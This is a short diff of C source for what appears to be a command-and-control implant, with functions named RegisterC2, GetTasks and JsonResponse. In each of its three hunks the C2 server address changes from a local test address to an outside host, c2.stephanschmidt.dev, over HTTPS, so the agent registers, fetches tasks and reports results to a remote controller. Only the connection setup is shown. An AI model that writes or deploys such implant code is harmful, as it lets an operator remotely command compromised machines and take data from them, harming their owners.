@@ -49,8 +49,8 @@ void RegisterC2(){
     {
         HINTERNET connection = WinHttpConnect(
             session, 
-            L"127.0.0.1", 
-            5000, 
+            L"c2.stephanschmidt.dev", 
+            INTERNET_DEFAULT_HTTPS_PORT, 
             0
         );
         
@@ -125,8 +125,8 @@ WINBOOL GetTasks(wchar_t* response){
     {
         HINTERNET connection = WinHttpConnect(
             session, 
-            L"127.0.0.1", 
-            5000, 
+            L"c2.stephanschmidt.dev", 
+            INTERNET_DEFAULT_HTTPS_PORT, 
             0
         );
         
@@ -196,8 +196,8 @@ void JsonResponse(char* jsonData, DWORD size){
     {
         HINTERNET connection = WinHttpConnect(
             session, 
-            L"127.0.0.1", 
-            5000, 
+            L"c2.stephanschmidt.dev", 
+            INTERNET_DEFAULT_HTTPS_PORT, 
             0
         );
         
